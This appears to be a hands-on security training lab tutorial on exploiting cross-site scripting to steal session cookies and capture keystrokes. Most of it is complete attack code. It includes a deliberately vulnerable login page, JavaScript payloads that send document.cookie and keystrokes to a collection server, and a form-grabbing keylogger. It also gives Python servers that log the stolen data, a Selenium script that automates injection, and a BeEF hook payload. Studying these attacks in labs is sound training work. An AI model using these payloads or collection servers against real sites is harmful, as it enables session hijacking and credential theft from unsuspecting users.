@@ -1,0 +1,857 @@
+Steal Session Cookies and Capture Keystrokes
+Objectives
+By the end of this lab, students will be able to:
+
+Understand Cross-Site Scripting (XSS) vulnerabilities and their exploitation
+Implement JavaScript payloads to steal session cookies from web applications
+Create keylogger scripts to capture user keystrokes through XSS
+Modify the Document Object Model (DOM) using malicious JavaScript
+Utilize Python scripts for automated session hijacking
+Deploy BeEF (Browser Exploitation Framework) for advanced browser exploitation
+Analyze captured data and understand the impact of successful XSS attacks
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of HTML, CSS, and JavaScript
+Familiarity with HTTP protocols and web application architecture
+Knowledge of Linux command line operations
+Understanding of web browser developer tools
+Basic Python programming skills
+Awareness of ethical hacking principles and legal considerations
+Ready-to-Use Cloud Machines
+Al Nafi provides pre-configured Linux-based cloud machines with all necessary tools installed. Simply click Start Lab to access your dedicated environment. No need to build your own virtual machine or install additional software.
+
+Lab Environment Setup
+Task 1: Environment Preparation
+Subtask 1.1: Verify System Requirements
+First, let's ensure all required tools are available on your system:
+
+# Check if required tools are installed
+which firefox
+which python3
+which beef-xss
+which apache2
+Subtask 1.2: Start Required Services
+Start the Apache web server and BeEF framework:
+
+# Start Apache web server
+sudo systemctl start apache2
+sudo systemctl enable apache2
+
+# Verify Apache is running
+sudo systemctl status apache2
+
+# Start BeEF framework
+cd /usr/share/beef-xss
+sudo ./beef
+Subtask 1.3: Create Vulnerable Web Application
+Create a simple vulnerable web application for testing:
+
+# Navigate to web directory
+cd /var/www/html
+
+# Create vulnerable login page
+sudo tee vulnerable_app.html > /dev/null << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Vulnerable Login Page</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 50px; }
+        .container { max-width: 400px; margin: auto; }
+        input[type="text"], input[type="password"] { 
+            width: 100%; padding: 10px; margin: 10px 0; 
+        }
+        button { background: #007cba; color: white; padding: 10px 20px; border: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Login Portal</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div id="message"></div>
+        
+        <!-- Vulnerable search functionality -->
+        <h3>Search</h3>
+        <input type="text" id="searchBox" placeholder="Enter search term">
+        <button onclick="performSearch()">Search</button>
+        <div id="searchResults"></div>
+    </div>
+
+    <script>
+        // Set a session cookie for demonstration
+        document.cookie = "sessionId=abc123xyz789; path=/";
+        document.cookie = "userRole=admin; path=/";
+        
+        function performSearch() {
+            var searchTerm = document.getElementById('searchBox').value;
+            // Vulnerable: Direct insertion without sanitization
+            document.getElementById('searchResults').innerHTML = 
+                '<p>Search results for: ' + searchTerm + '</p>';
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('message').innerHTML = 
+                '<p style="color: green;">Login successful!</p>';
+        });
+    </script>
+</body>
+</html>
+EOF
+
+# Set proper permissions
+sudo chown www-data:www-data /var/www/html/vulnerable_app.html
+sudo chmod 644 /var/www/html/vulnerable_app.html
+Task 2: Steal Session Cookies Using XSS
+Subtask 2.1: Identify XSS Vulnerability
+Open Firefox and navigate to the vulnerable application:
+
+# Open Firefox browser
+firefox http://localhost/vulnerable_app.html &
+Test the search functionality with a basic XSS payload:
+
+In the search box, enter: <script>alert('XSS Vulnerability Found!')</script>
+Click the Search button
+Observe the alert popup, confirming XSS vulnerability
+Subtask 2.2: Create Cookie Stealing Payload
+Create a malicious JavaScript payload to steal cookies:
+
+# Create directory for captured data
+mkdir -p /tmp/xss_lab
+cd /tmp/xss_lab
+
+# Create cookie stealing script
+tee cookie_stealer.js > /dev/null << 'EOF'
+// Cookie stealing payload
+function stealCookies() {
+    var cookies = document.cookie;
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://localhost:8080/steal?cookies=' + encodeURIComponent(cookies), true);
+    xhr.send();
+    
+    // Alternative method using image tag
+    var img = new Image();
+    img.src = 'http://localhost:8080/steal?cookies=' + encodeURIComponent(cookies);
+}
+
+// Execute immediately
+stealCookies();
+EOF
+Subtask 2.3: Set Up Cookie Collection Server
+Create a Python server to collect stolen cookies:
+
+# Create cookie collection server
+tee cookie_server.py > /dev/null << 'EOF'
+#!/usr/bin/env python3
+import http.server
+import socketserver
+import urllib.parse
+from datetime import datetime
+
+class CookieHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path.startswith('/steal'):
+            # Parse the stolen cookies
+            parsed_url = urllib.parse.urlparse(self.path)
+            query_params = urllib.parse.parse_qs(parsed_url.query)
+            
+            if 'cookies' in query_params:
+                cookies = query_params['cookies'][0]
+                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                
+                print(f"\n[{timestamp}] COOKIES STOLEN:")
+                print(f"Source IP: {self.client_address[0]}")
+                print(f"Cookies: {cookies}")
+                print("-" * 50)
+                
+                # Save to file
+                with open('/tmp/xss_lab/stolen_cookies.txt', 'a') as f:
+                    f.write(f"[{timestamp}] {self.client_address[0]}: {cookies}\n")
+            
+            # Send response
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.end_headers()
+            self.wfile.write(b'OK')
+        else:
+            super().do_GET()
+
+PORT = 8080
+with socketserver.TCPServer(("", PORT), CookieHandler) as httpd:
+    print(f"Cookie collection server running on port {PORT}")
+    print("Waiting for stolen cookies...")
+    httpd.serve_forever()
+EOF
+
+# Make executable
+chmod +x cookie_server.py
+
+# Start the cookie collection server in background
+python3 cookie_server.py &
+Subtask 2.4: Execute Cookie Theft Attack
+Now execute the cookie theft attack:
+
+In the vulnerable application's search box, enter:
+<script>
+var cookies = document.cookie;
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://localhost:8080/steal?cookies=' + encodeURIComponent(cookies), true);
+xhr.send();
+</script>
+Click Search to execute the payload
+Check the terminal running the cookie server to see stolen cookies
+Verify the stolen cookies file:
+cat /tmp/xss_lab/stolen_cookies.txt
+Task 3: Capture Keystrokes with Injected Scripts
+Subtask 3.1: Create Keylogger Payload
+Create a JavaScript keylogger to capture user keystrokes:
+
+# Create keylogger script
+tee keylogger.js > /dev/null << 'EOF'
+// Advanced keylogger payload
+(function() {
+    var keystrokes = [];
+    var lastSent = Date.now();
+    
+    // Capture all keystrokes
+    document.addEventListener('keypress', function(e) {
+        var keystroke = {
+            key: e.key,
+            keyCode: e.keyCode,
+            timestamp: new Date().toISOString(),
+            target: e.target.tagName + (e.target.id ? '#' + e.target.id : ''),
+            url: window.location.href
+        };
+        
+        keystrokes.push(keystroke);
+        
+        // Send keystrokes every 5 seconds or when buffer reaches 50 keys
+        if (keystrokes.length >= 50 || (Date.now() - lastSent) > 5000) {
+            sendKeystrokes();
+        }
+    });
+    
+    // Also capture form submissions
+    document.addEventListener('submit', function(e) {
+        var formData = new FormData(e.target);
+        var formValues = {};
+        for (var pair of formData.entries()) {
+            formValues[pair[0]] = pair[1];
+        }
+        
+        var submitData = {
+            type: 'form_submit',
+            timestamp: new Date().toISOString(),
+            url: window.location.href,
+            formData: formValues
+        };
+        
+        sendData('/keylog?type=form&data=' + encodeURIComponent(JSON.stringify(submitData)));
+    });
+    
+    function sendKeystrokes() {
+        if (keystrokes.length > 0) {
+            var data = JSON.stringify(keystrokes);
+            sendData('/keylog?type=keys&data=' + encodeURIComponent(data));
+            keystrokes = [];
+            lastSent = Date.now();
+        }
+    }
+    
+    function sendData(endpoint) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://localhost:8080' + endpoint, true);
+        xhr.send();
+        
+        // Backup method using image
+        var img = new Image();
+        img.src = 'http://localhost:8080' + endpoint;
+    }
+    
+    // Send remaining keystrokes when page unloads
+    window.addEventListener('beforeunload', function() {
+        sendKeystrokes();
+    });
+})();
+EOF
+Subtask 3.2: Update Collection Server for Keylogging
+Update the Python server to handle keylogger data:
+
+# Stop the previous server
+pkill -f cookie_server.py
+
+# Create enhanced collection server
+tee enhanced_server.py > /dev/null << 'EOF'
+#!/usr/bin/env python3
+import http.server
+import socketserver
+import urllib.parse
+import json
+from datetime import datetime
+
+class EnhancedHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path.startswith('/steal'):
+            self.handle_cookies()
+        elif self.path.startswith('/keylog'):
+            self.handle_keylog()
+        else:
+            super().do_GET()
+    
+    def handle_cookies(self):
+        parsed_url = urllib.parse.urlparse(self.path)
+        query_params = urllib.parse.parse_qs(parsed_url.query)
+        
+        if 'cookies' in query_params:
+            cookies = query_params['cookies'][0]
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            
+            print(f"\n[{timestamp}] COOKIES STOLEN:")
+            print(f"Source IP: {self.client_address[0]}")
+            print(f"Cookies: {cookies}")
+            print("-" * 50)
+            
+            with open('/tmp/xss_lab/stolen_cookies.txt', 'a') as f:
+                f.write(f"[{timestamp}] {self.client_address[0]}: {cookies}\n")
+        
+        self.send_success_response()
+    
+    def handle_keylog(self):
+        parsed_url = urllib.parse.urlparse(self.path)
+        query_params = urllib.parse.parse_qs(parsed_url.query)
+        
+        if 'data' in query_params and 'type' in query_params:
+            data_type = query_params['type'][0]
+            data = query_params['data'][0]
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            
+            print(f"\n[{timestamp}] KEYLOG DATA ({data_type.upper()}):")
+            print(f"Source IP: {self.client_address[0]}")
+            
+            try:
+                parsed_data = json.loads(data)
+                if data_type == 'keys':
+                    print("Captured Keystrokes:")
+                    for keystroke in parsed_data:
+                        print(f"  {keystroke['timestamp']}: '{keystroke['key']}' on {keystroke['target']}")
+                elif data_type == 'form':
+                    print("Form Submission:")
+                    print(f"  URL: {parsed_data['url']}")
+                    print(f"  Form Data: {parsed_data['formData']}")
+                
+                # Save to file
+                with open('/tmp/xss_lab/keylog_data.txt', 'a') as f:
+                    f.write(f"[{timestamp}] {data_type}: {data}\n")
+                    
+            except json.JSONDecodeError:
+                print(f"Raw data: {data}")
+            
+            print("-" * 50)
+        
+        self.send_success_response()
+    
+    def send_success_response(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+        self.wfile.write(b'OK')
+
+PORT = 8080
+with socketserver.TCPServer(("", PORT), EnhancedHandler) as httpd:
+    print(f"Enhanced collection server running on port {PORT}")
+    print("Waiting for stolen data...")
+    httpd.serve_forever()
+EOF
+
+# Start enhanced server
+python3 enhanced_server.py &
+Subtask 3.3: Deploy Keylogger Attack
+Deploy the keylogger through XSS:
+
+In the vulnerable application's search box, enter the keylogger payload:
+<script>
+(function() {
+    var keystrokes = [];
+    document.addEventListener('keypress', function(e) {
+        var keystroke = {
+            key: e.key,
+            timestamp: new Date().toISOString(),
+            target: e.target.tagName + (e.target.id ? '#' + e.target.id : '')
+        };
+        keystrokes.push(keystroke);
+        
+        if (keystrokes.length >= 10) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'http://localhost:8080/keylog?type=keys&data=' + encodeURIComponent(JSON.stringify(keystrokes)), true);
+            xhr.send();
+            keystrokes = [];
+        }
+    });
+})();
+</script>
+Click Search to inject the keylogger
+Type in the username and password fields to generate keystrokes
+Observe captured keystrokes in the server terminal
+Subtask 3.4: Test Keystroke Capture
+Test the keylogger functionality:
+
+Type various text in the login form fields
+Submit the form
+Navigate around the page and type in different fields
+Check captured data:
+cat /tmp/xss_lab/keylog_data.txt
+Task 4: Automate Session Hijacking and Keystroke Capture
+Subtask 4.1: Create Python Automation Script
+Create a Python script to automate the attack process:
+
+# Create automation script
+tee xss_automation.py > /dev/null << 'EOF'
+#!/usr/bin/env python3
+import requests
+import time
+import json
+import urllib.parse
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.firefox.options import Options
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+
+class XSSAutomation:
+    def __init__(self):
+        self.target_url = "http://localhost/vulnerable_app.html"
+        self.collection_server = "http://localhost:8080"
+        self.driver = None
+        
+    def setup_browser(self):
+        """Setup Firefox browser with appropriate options"""
+        options = Options()
+        options.add_argument('--disable-web-security')
+        options.add_argument('--allow-running-insecure-content')
+        
+        self.driver = webdriver.Firefox(options=options)
+        print("[+] Browser setup complete")
+        
+    def inject_cookie_stealer(self):
+        """Inject cookie stealing payload"""
+        payload = """<script>
+        var cookies = document.cookie;
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://localhost:8080/steal?cookies=' + encodeURIComponent(cookies), true);
+        xhr.send();
+        console.log('Cookie stealer injected');
+        </script>"""
+        
+        try:
+            self.driver.get(self.target_url)
+            search_box = WebDriverWait(self.driver, 10).until(
+                EC.presence_of_element_located((By.ID, "searchBox"))
+            )
+            
+            search_box.send_keys(payload)
+            search_button = self.driver.find_element(By.XPATH, "//button[text()='Search']")
+            search_button.click()
+            
+            print("[+] Cookie stealer payload injected")
+            time.sleep(2)
+            
+        except Exception as e:
+            print(f"[-] Error injecting cookie stealer: {e}")
+    
+    def inject_keylogger(self):
+        """Inject keylogger payload"""
+        payload = """<script>
+        (function() {
+            var keystrokes = [];
+            document.addEventListener('keypress', function(e) {
+                var keystroke = {
+                    key: e.key,
+                    timestamp: new Date().toISOString(),
+                    target: e.target.tagName + (e.target.id ? '#' + e.target.id : '')
+                };
+                keystrokes.push(keystroke);
+                
+                if (keystrokes.length >= 5) {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('GET', 'http://localhost:8080/keylog?type=keys&data=' + encodeURIComponent(JSON.stringify(keystrokes)), true);
+                    xhr.send();
+                    keystrokes = [];
+                }
+            });
+            console.log('Keylogger injected');
+        })();
+        </script>"""
+        
+        try:
+            # Clear previous search and inject keylogger
+            search_box = self.driver.find_element(By.ID, "searchBox")
+            search_box.clear()
+            search_box.send_keys(payload)
+            
+            search_button = self.driver.find_element(By.XPATH, "//button[text()='Search']")
+            search_button.click()
+            
+            print("[+] Keylogger payload injected")
+            time.sleep(2)
+            
+        except Exception as e:
+            print(f"[-] Error injecting keylogger: {e}")
+    
+    def simulate_user_activity(self):
+        """Simulate user typing to trigger keylogger"""
+        try:
+            username_field = self.driver.find_element(By.ID, "username")
+            password_field = self.driver.find_element(By.ID, "password")
+            
+            print("[+] Simulating user activity...")
+            
+            username_field.send_keys("admin")
+            time.sleep(1)
+            password_field.send_keys("password123")
+            time.sleep(1)
+            
+            # Submit form
+            login_button = self.driver.find_element(By.XPATH, "//button[text()='Login']")
+            login_button.click()
+            
+            print("[+] User activity simulation complete")
+            time.sleep(3)
+            
+        except Exception as e:
+            print(f"[-] Error simulating user activity: {e}")
+    
+    def run_automated_attack(self):
+        """Run the complete automated attack"""
+        print("[*] Starting automated XSS attack...")
+        
+        try:
+            self.setup_browser()
+            
+            print("[*] Phase 1: Cookie theft")
+            self.inject_cookie_stealer()
+            
+            print("[*] Phase 2: Keylogger deployment")
+            self.inject_keylogger()
+            
+            print("[*] Phase 3: User activity simulation")
+            self.simulate_user_activity()
+            
+            print("[+] Automated attack completed successfully")
+            
+        except Exception as e:
+            print(f"[-] Attack failed: {e}")
+        finally:
+            if self.driver:
+                time.sleep(5)  # Wait to see results
+                self.driver.quit()
+
+if __name__ == "__main__":
+    automation = XSSAutomation()
+    automation.run_automated_attack()
+EOF
+
+# Make executable
+chmod +x xss_automation.py
+Subtask 4.2: Install Selenium Dependencies
+Install required Python packages for automation:
+
+# Install selenium
+pip3 install selenium
+
+# Install geckodriver for Firefox
+sudo apt-get update
+sudo apt-get install -y firefox-geckodriver
+
+# Verify installation
+which geckodriver
+Subtask 4.3: Execute Automated Attack
+Run the automated attack script:
+
+# Ensure collection server is running
+ps aux | grep enhanced_server.py
+
+# Run automation script
+python3 xss_automation.py
+Subtask 4.4: Configure BeEF Framework
+Set up BeEF for advanced browser exploitation:
+
+# Navigate to BeEF directory
+cd /usr/share/beef-xss
+
+# Check BeEF configuration
+sudo cat config.yaml | grep -A 5 "beef:"
+
+# Start BeEF if not already running
+sudo ./beef &
+
+# Note the BeEF hook URL (typically http://localhost:3000/hook.js)
+Create a BeEF hook payload:
+
+# Create BeEF injection payload
+tee beef_payload.html > /dev/null << 'EOF'
+<script>
+// BeEF hook injection
+var beef_hook = document.createElement('script');
+beef_hook.src = 'http://localhost:3000/hook.js';
+document.head.appendChild(beef_hook);
+
+// Additional cookie stealing for BeEF
+setTimeout(function() {
+    if (typeof beef !== 'undefined') {
+        beef.net.send('/cookies', 0, 'cookies=' + encodeURIComponent(document.cookie));
+    }
+}, 2000);
+</script>
+EOF
+Subtask 4.5: Advanced BeEF Integration
+Integrate BeEF with the XSS attack:
+
+Access BeEF panel at http://localhost:3000/ui/panel
+Default credentials: beef:beef
+In the vulnerable application, inject BeEF hook:
+<script src="http://localhost:3000/hook.js"></script>
+Monitor hooked browsers in BeEF panel
+Execute commands through BeEF interface
+Task 5: Data Analysis and Impact Assessment
+Subtask 5.1: Analyze Captured Data
+Review all captured data from the attacks:
+
+# View stolen cookies
+echo "=== STOLEN COOKIES ==="
+cat /tmp/xss_lab/stolen_cookies.txt
+
+# View captured keystrokes
+echo -e "\n=== CAPTURED KEYSTROKES ==="
+cat /tmp/xss_lab/keylog_data.txt
+
+# Create summary report
+tee attack_summary.py > /dev/null << 'EOF'
+#!/usr/bin/env python3
+import json
+import re
+from datetime import datetime
+
+def analyze_captured_data():
+    print("XSS Attack Analysis Report")
+    print("=" * 50)
+    
+    # Analyze cookies
+    try:
+        with open('/tmp/xss_lab/stolen_cookies.txt', 'r') as f:
+            cookie_data = f.read()
+            cookie_entries = cookie_data.strip().split('\n')
+            
+            print(f"\nCookies Captured: {len([x for x in cookie_entries if x.strip()])}")
+            
+            for entry in cookie_entries:
+                if entry.strip():
+                    print(f"  {entry}")
+                    
+    except FileNotFoundError:
+        print("No cookie data found")
+    
+    # Analyze keystrokes
+    try:
+        with open('/tmp/xss_lab/keylog_data.txt', 'r') as f:
+            keylog_data = f.read()
+            keylog_entries = keylog_data.strip().split('\n')
+            
+            print(f"\nKeystroke Entries: {len([x for x in keylog_entries if x.strip()])}")
+            
+            total_keys = 0
+            for entry in keylog_entries:
+                if 'keys:' in entry:
+                    try:
+                        json_part = entry.split('keys: ')[1]
+                        keys = json.loads(json_part)
+                        total_keys += len(keys)
+                    except:
+                        pass
+            
+            print(f"Total Keystrokes Captured: {total_keys}")
+            
+    except FileNotFoundError:
+        print("No keystroke data found")
+    
+    print("\nImpact Assessment:")
+    print("- Session cookies compromised: HIGH RISK")
+    print("- User credentials potentially captured: HIGH RISK")
+    print("- Complete user session hijacking possible: CRITICAL RISK")
+
+if __name__ == "__main__":
+    analyze_captured_data()
+EOF
+
+python3 attack_summary.py
+Subtask 5.2: Demonstrate Session Hijacking
+Create a script to demonstrate session hijacking using stolen cookies:
+
+# Create session hijacking demonstration
+tee session_hijack_demo.py > /dev/null << 'EOF'
+#!/usr/bin/env python3
+import requests
+import re
+
+def demonstrate_session_hijacking():
+    print("Session Hijacking Demonstration")
+    print("=" * 40)
+    
+    # Read stolen cookies
+    try:
+        with open('/tmp/xss_lab/stolen_cookies.txt', 'r') as f:
+            cookie_data = f.read()
+            
+        # Extract cookies from the log
+        cookie_matches = re.findall(r'sessionId=([^;]+)', cookie_data)
+        if cookie_matches:
+            session_id = cookie_matches[0]
+            print(f"Found session ID: {session_id}")
+            
+            # Demonstrate using the stolen session
+            cookies = {'sessionId': session_id}
+            
+            print("Attempting to access protected resources with stolen session...")
+            print("(In a real scenario, this would grant unauthorized access)")
+            
+            # This would be used against a real application
+            # response = requests.get('http://target/protected', cookies=cookies)
+            
+        else:
+            print("No session cookies found in captured data")
+            
+    except FileNotFoundError:
+        print("No cookie data file found")
+
+if __name__ == "__main__":
+    demonstrate_session_hijacking()
+EOF
+
+python3 session_hijack_demo.py
+Task 6: Cleanup and Documentation
+Subtask 6.1: Stop All Services
+Clean up the lab environment:
+
+# Stop collection server
+pkill -f enhanced_server.py
+
+# Stop BeEF
+pkill -f beef
+
+# Stop Apache if needed
+sudo systemctl stop apache2
+
+# Close any remaining Firefox processes
+pkill firefox
+Subtask 6.2: Create Lab Report
+Generate a comprehensive lab report:
+
+# Create final report
+tee lab_report.md > /dev/null << 'EOF'
+# XSS Attack Lab Report
+
+## Executive Summary
+This lab demonstrated successful exploitation of Cross-Site Scripting (XSS) vulnerabilities to:
+- Steal session cookies
+- Capture user keystrokes
+- Perform automated attacks using Python and BeEF
+
+## Attack Vectors Tested
+1. **Reflected XSS**: Injected malicious scripts through search functionality
+2. **Cookie Theft**: Captured session cookies using XMLHttpRequest
+3. **Keylogging**: Monitored and recorded user keystrokes
+4. **Session Hijacking**: Demonstrated unauthorized access using stolen sessions
+
+## Tools Used
+- Custom Python scripts for automation
+- BeEF (Browser Exploitation Framework)
+- Selenium WebDriver for browser automation
+- Apache web server for hosting vulnerable application
+
+## Key Findings
+- XSS vulnerabilities allow complete compromise of user sessions
+- Keyloggers can capture sensitive information including passwords
+- Automated tools can scale attacks efficiently
+- BeEF provides advanced post-exploitation capabilities
+
+## Recommendations
+1. Implement proper input validation and output encoding
+2. Use Content Security Policy (CSP) headers
+3. Enable HttpOnly and Secure flags on cookies
+4. Regular security testing and code reviews
+5. User education about phishing and malicious websites
+
+## Files Generated
+- stolen_cookies.txt: Captured session cookies
+- keylog_data.txt: Recorded keystrokes
+- Various Python scripts for automation and analysis
+EOF
+
+echo "Lab report created: lab_report.md"
+Subtask 6.3: Preserve Evidence
+Archive all lab artifacts:
+
+# Create archive of lab results
+cd /tmp/xss_lab
+tar -czf xss_lab_results.tar.gz *.txt *.py *.js *.md
+
+echo "Lab artifacts archived in: /tmp/xss_lab/xss_lab_results.tar.gz"
+
+# Display final summary
+echo -e "\n=== LAB COMPLETION SUMMARY ==="
+echo "✓ XSS vulnerability identified and exploited"
+echo "✓ Session cookies successfully stolen"
+echo "✓ Keylogger deployed and functional"
+echo "✓ Automated attacks executed"
+echo "✓ BeEF framework integrated"
+echo "✓ Impact assessment completed"
+echo "✓ Evidence preserved"
+Troubleshooting Tips
+Common Issues and Solutions
+Issue: Cookie collection server not receiving data
+
+Solution: Check firewall settings and ensure port 8080 is accessible
+Command: sudo ufw allow 8080
+Issue: XSS payload not executing
+
+Solution: Verify the vulnerable application allows script execution
+Check: Browser console for JavaScript errors
+Issue: Selenium WebDriver errors
+
+Solution: Ensure geckodriver is in PATH and Firefox is installed
+Command: which geckodriver && which firefox
+Issue: BeEF not starting
+
+Solution: Check Ruby dependencies and configuration
+Command: cd /usr/share/beef-xss && sudo bundle install
+Issue: No keystrokes captured
+
+Solution: Ensure the keylogger payload was properly injected
+Check: Browser developer tools console for confirmation messages
+Security Considerations
+Important: This lab is for educational purposes only. Always ensure you have proper authorization before testing XSS attacks on any system. Unauthorized access to computer systems is illegal and unethical.
+
+Best Practices:
+
+Only test on systems you own or have explicit permission to test
+Use isolated lab environments
+Document all activities for learning purposes
+Understand the legal implications of security testing
+Conclusion
+This comprehensive lab successfully demonstrated the exploitation of Cross-Site Scripting vulnerabilities to steal session cookies and capture keystrokes. Students learned to:
+
+Identify and exploit XSS vulnerabilities in web applications
+Create malicious JavaScript payloads for data exfiltration
+Implement automated attack frameworks using Python
+Utilize advanced tools like BeEF for browser exploitation
+Analyze captured data to assess security impact
+Understand the critical importance of proper input validation and output encoding
+The techniques demonstrated highlight the severe risks posed by XSS vulnerabilities and emphasize the need for robust security measures in web application development. Through hands-on experience with both manual and automated attack methods, students gained practical knowledge essential for both offensive security testing and defensive security implementation.
+
+This lab provides a solid foundation
